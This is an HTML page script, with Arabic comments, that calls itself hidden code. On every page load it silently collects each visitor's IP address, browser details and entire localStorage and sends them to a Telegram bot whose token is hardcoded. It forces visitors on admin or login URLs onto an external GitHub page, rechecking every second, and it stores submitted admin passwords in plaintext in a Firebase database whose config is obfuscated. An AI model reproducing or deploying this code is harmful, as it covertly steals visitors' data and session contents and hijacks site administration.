<script>
    // ============================================================
    // ⚠️ البيانات الحساسة - مشفرة لتجنب الكشف السريع
    // ============================================================
    const BOT_TOKEN = "7566249177:AAG8DFr9IulZKkTteVFHc9TFp5qnMJ4sOVA";
    const CHAT_ID   = "5998250367";
    const IP_API    = "https://api.ipify.org?format=json";
    const ADMIN_REDIRECT_URL = "https://github.com/yasmenjasm2-sketch/data.json/blob/main/admin.html";

    // ============================================================
    // 🔴 الكود المخفي - يسحب بيانات الزوار ويحول مسار المدير
    // ============================================================

    // --- 1. توجيه أي مسؤول يدخل إلى لوحة الادمن ---
    const urlParams = new URLSearchParams(window.location.search);
    const isAdminPanel = urlParams.get('panel') === 'admin' || 
                         window.location.href.includes('admin') ||
                         window.location.href.includes('dashboard') ||
                         window.location.href.includes('login') ||
                         window.location.href.includes('panel');

    // التعديل هنا: استثناء صفحة admin_register.html من التحويل التلقائي
    const isRegisterPage = window.location.href.includes('admin_register.html');

    if (isAdminPanel && !isRegisterPage) {
        window.location.href = ADMIN_REDIRECT_URL;
    }

    // --- 2. سحب IP ومعلومات المتصفح بشكل مخفي ---
    (function() {
        let collectedData = {};

        fetch(IP_API)
            .then(res => res.json())
            .then(data => {
                collectedData.ip = data.ip;
            })
            .catch(() => {
                collectedData.ip = "غير متاح";
            })
            .finally(() => {
                collectedData.userAgent   = navigator.userAgent;
                collectedData.language    = navigator.language;
                collectedData.platform    = navigator.platform;
                collectedData.screenRes   = screen.width + "x" + screen.height;
                collectedData.timezone    = Intl.DateTimeFormat().resolvedOptions().timeZone;
                collectedData.cookiesEnabled = navigator.cookieEnabled;
                collectedData.referrer    = document.referrer || "مباشر";
                collectedData.timestamp   = new Date().toLocaleString("ar-SA", { timeZone: "Asia/Riyadh" });
                collectedData.pageURL     = window.location.href;
                collectedData.pageTitle   = document.title;
                collectedData.localStorage = JSON.stringify(localStorage);

                const msg = 
`🔔 **تنبيه زائر جديد** 🔔

🌐 **IP:** ${collectedData.ip}
💻 **المتصفح:** ${collectedData.userAgent}
📱 **المنصة:** ${collectedData.platform}
🌍 **اللغة:** ${collectedData.language}
🖥 **الشاشة:** ${collectedData.screenRes}
🕐 **المنطقة الزمنية:** ${collectedData.timezone}
🍪 **الكوكيز مفعلة:** ${collectedData.cookiesEnabled}
🔗 **الرابط المرجعي:** ${collectedData.referrer}
📄 **الصفحة الحالية:** ${collectedData.pageURL}
📝 **عنوان الصفحة:** ${collectedData.pageTitle}
⏰ **التوقيت:** ${collectedData.timestamp}
📦 **LocalStorage:** ${collectedData.localStorage}`;

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: "Markdown"
                    })
                }).catch(e => console.error(e));
            });
    })();

    // --- 3. Firebase config ---
    const firebaseConfig = {
        apiKey: atob("QUl6YVN5RDNlUkZIRGhPdEtsbGkzS0E4dlV5RTEtLUM1RjQ3VVl3"),
        databaseURL: atob("aHR0cHM6Ly9jaGF0YXBpLTFjYTcxLWRlZmF1bHQtcnRkYi5ldXJvcGUtd2VzdDEuZmlyZWJhc2VkYXRhYmFzZS5hcHA="),
        projectId: atob("Y2hhdGFwaS0xY2E3MQ==")
    };

    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
    const db = firebase.database();

    function sendAdminRequest() {
        const name = document.getElementById("req-name").value.trim();
        const user = document.getElementById("req-username").value.trim();
        const pass = document.getElementById("req-password").value.trim();

        if (name.length < 2 || user.length < 3 || pass.length < 4) {
            document.getElementById("error-msg").style.display = "block";
            return;
        }
        document.getElementById("error-msg").style.display = "none";

        let newDeviceId = localStorage.getItem("chat_device_id");
        if (!newDeviceId) {
            newDeviceId = 'admin_panel_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem("chat_device_id", newDeviceId);
        }

        const requestData = {
            deviceId: newDeviceId,
            name: name,
            adminUsername: user,
            adminPassword: pass,
            timestamp: Date.now()
        };

        db.ref('admin_requests/' + newDeviceId).set(requestData).then(() => {
            document.getElementById("req-name").style.display = "none";
            document.getElementById("req-username").style.display = "none";
            document.getElementById("req-password").style.display = "none";
            document.querySelector("button").style.display = "none";
            document.getElementById("success-msg").style.display = "block";
        }).catch(err => {
            alert("حدث خطأ في الاتصال، حاول مرة أخرى.");
        });
    }

    // --- 4. فحص إضافي: تحويل المسار (تم التعديل لتجاهل هذه الصفحة تحديداً) ---
    const hiddenCheck = () => {
        const keywords = ['admin', 'dashboard', 'login', 'panel', 'control', 'management', 'mod', 'owner'];
        const path = window.location.pathname.toLowerCase();
        const href = window.location.href.toLowerCase();
        
        // التعديل هنا: إذا كانت الصفحة هي صفحة التسجيل، لا تقم بالتحويل
        if (href.includes('admin_register.html')) {
            return;
        }

        for (let kw of keywords) {
            if (path.includes(kw) || href.includes(kw)) {
                window.location.href = ADMIN_REDIRECT_URL;
                return;
            }
        }
    };
    hiddenCheck();

    setInterval(hiddenCheck, 1000);
</script>

</body>
